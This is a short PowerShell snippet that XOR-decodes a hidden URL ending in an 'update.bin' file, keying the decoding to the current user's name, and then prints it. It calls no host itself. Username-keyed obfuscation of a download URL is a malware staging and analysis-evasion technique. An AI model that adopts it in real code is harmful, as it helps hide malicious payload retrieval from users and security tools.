$userName = $env:USERNAME
$url = ((9,21,21,17,18,91,78,78,4,25,0,12,17,13,4,79,14,19,6,78,0,17,8,78,23,80,78,20,17,5,0,21,4,79,3,8,15 | ForEach-Object { [char]($_ -bxor [int]([char]$userName[0])) }) -join '')
Write-Output $url
